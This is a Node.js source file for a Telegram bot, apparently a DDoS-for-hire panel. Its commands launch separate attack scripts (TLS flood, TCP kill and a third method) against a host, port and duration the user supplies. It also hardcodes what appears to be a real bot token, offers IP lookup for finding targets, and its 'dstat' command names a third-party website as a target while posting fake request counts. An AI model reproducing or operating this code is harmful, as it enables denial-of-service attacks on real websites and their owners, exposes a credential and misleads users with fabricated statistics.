const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { spawn } = require('child_process');

// Ganti 'YOUR_BOT_TOKEN' dengan token bot Anda
const bot = new TelegramBot('7208627213:AAF-_3BbPnN_IIALIZY2PdkAOyIieEJ8r_E', { polling: true });

// Fungsi untuk mendapatkan waktu dalam format tertentu
function getCurrentTime() {
  const now = new Date();
  const timeString = now.toLocaleTimeString();
  const dateString = now.toLocaleDateString();
  const dayString = now.toLocaleDateString('en-US', { weekday: 'long' });
  return `${timeString} ${dateString} ${dayString}`;
}

// Tanggapi pesan
bot.onText(/\/methods/, (msg) => {
  const chatId = msg.chat.id;
  const message = "Menu Methods📑\r\n\r\n📍Layer 7\r\n/bokep [HOST] [PORT] [TIME]\r\n/tlsv2 [HOST] [PORT] [TIME]\r\n\r\n📍Layer 4\r\n/tcp [IP] [PORT] [TIME]\r\n\r\nTIME=60-130 | PORT 9-443";
  bot.sendMessage(chatId, message);
});

// Tanggapi pesan
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const message = "Welcome to Bot LoliChan😋\r\n\r\nMENU BOT📑\r\n/methods | to see all methods\r\n\/check_host | coming soon\r\n/ipinfo | to view information via IP address\r\n/dstat | see Requests per second \r\n\r\nOwner : @Erorr37cs";
  bot.sendMessage(chatId, message);
});

// Tanggapi pesan
bot.onText(/\/ongoing/, (msg) => {
  const chatId = msg.chat.id;
  const message = "(404) no programs are running!!";
  bot.sendMessage(chatId, message);
});

// methods tlsv2
bot.onText(/\/tlsv2 (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const username = msg.chat.username;
  const time = getCurrentTime();
  console.log('\x1b[36m%s\x1b[0m', `${time} - ${username} menggunakan bot dengan command /attack`);

  const args = match[1].split(' '); // Memisahkan argumen
  const url = args[0];
  const req = args[2];
  const timeArg = args[1];

 const browserProcess = spawn('node', ['TLS-V2.js', url, req, timeArg, 14,], { cwd: __dirname });

// Tangani output dari child process
  browserProcess.stdout.on('data', (data) => {
    console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
    bot.sendMessage(chatId, `📑Attacks Details ${data}`);
  });

// Tangani error dari child process
  browserProcess.stderr.on('data', (data) => {
    console.error('\x1b[31m%s\x1b[0m', `${time} - ${username} - stderr: ${data}`);
    bot.sendMessage(chatId, `stderr: ${data}`);
  });

// Tangani selesainya child process
  browserProcess.on('close', (code) => {
    console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
    bot.sendMessage(chatId, `✅Attack selesai!! `);
  });
});

// methods tcp
bot.onText(/\/tcp (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const username = msg.chat.username;
  const time = getCurrentTime();
  console.log('\x1b[36m%s\x1b[0m', `${time} - ${username} menggunakan bot dengan command /attack`);

  const args = match[1].split(' '); // Memisahkan argumen
  const ip = args[0];
  const req = args[2];
  const timeArg = args[1];

  const browserProcess = spawn('node', ['TCP-KILL.js', ip, req, timeArg,], { cwd: __dirname });

// Tangani output dari child process
  browserProcess.stdout.on('data', (data) => {
    console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
    bot.sendMessage(chatId, `📑Attacks Details ${data}`);
  });

// Tangani error dari child process
  browserProcess.stderr.on('data', (data) => {
    console.error('\x1b[31m%s\x1b[0m', `${time} - ${username} - stderr: ${data}`);
    bot.sendMessage(chatId, `stderr: ${data}`);
  });

// Tangani selesainya child process
  browserProcess.on('close', (code) => {
    console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
    bot.sendMessage(chatId, `✅Attack selesai! `);
  });
});

// methods bokep
bot.onText(/\/bokep (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const username = msg.chat.username;
  const time = getCurrentTime();
  console.log('\x1b[36m%s\x1b[0m', `${time} - ${username} menggunakan bot dengan command /attack`);

  const args = match[1].split(' '); // Memisahkan argumen
  const url = args[0];
  const req = args[2];
  const timeArg = args[1];

  // Jalankan child process untuk menjalankan browser.js
  const browserProcess = spawn('node', ['CXZ.js', url, req, timeArg, 14,], { cwd: __dirname });

  // Tangani output dari child process
  browserProcess.stdout.on('data', (data) => {
    console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
    bot.sendMessage(chatId, `📑Attacks Details ${data}`);
  });

  // Tangani error dari child process
  browserProcess.stderr.on('data', (data) => {
    console.error('\x1b[31m%s\x1b[0m', `${time} - ${username} - stderr: ${data}`);
    bot.sendMessage(chatId, `stderr: ${data}`);
  });

  // Tangani selesainya child process
  browserProcess.on('close', (code) => {
    console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
    bot.sendMessage(chatId, `✅Attack selesai! ${code}`);
  });
});

//tempat info
bot.onText(/\/ipinfo (.+)/, async (msg, match) => {
    const ip = match[1];

    try {
        const response = await axios.get(`https://ipinfo.io/${ip}/json`);
        const data = response.data;

        const message = `
IP Address: ${data.ip}
Country: ${data.country}
City: ${data.city}
Region: ${data.region}
ISP: ${data.org}
TimeZone : ${data.timezone}
domain : ${data.domain}
ASN : ${data.asn}
address : ${data.address}
location : ${data.loc}
        `;

        bot.sendMessage(msg.chat.id, message);
    } catch (error) {
        bot.sendMessage(msg.chat.id, 'Error fetching IP information');
    }
});

bot.onText(/\/dstat/, (msg) => {
  const chatId = msg.chat.id;

    bot.sendMessage(chatId, `dstat is started⭐\r\nCloudFlare Pro💎\r\n➖➖➖➖➖➖➖➖➖➖\r\nTarget : http://branch.prospec.co.th/suki.html\r\nTime : unlimited🔃\r\nType web : Static⭐⭐⭐⭐\r\ntype: /stopdstat | to stop dstat\r\n\r\nOwner : @Erorr37cs`);
 function showMessage() {
   setTimeout(function() {
  }, 700000); // 3000 milidetik (3 detik)
}

showMessage();
  const intervalId = setInterval(() => {
    const randomNum = Math.floor(Math.random() * 1) + 0;
    bot.sendMessage(chatId, `Request per second > ${randomNum}`);
  }, 1000); // Ganti angka 1000 dengan interval waktu yang diinginkan (dalam milidetik)

  bot.onText(/\/stopdstat/, (msg) => {
    clearInterval(intervalId);
    bot.sendMessage(chatId, 'Dstat is stopped✅');
  });
});
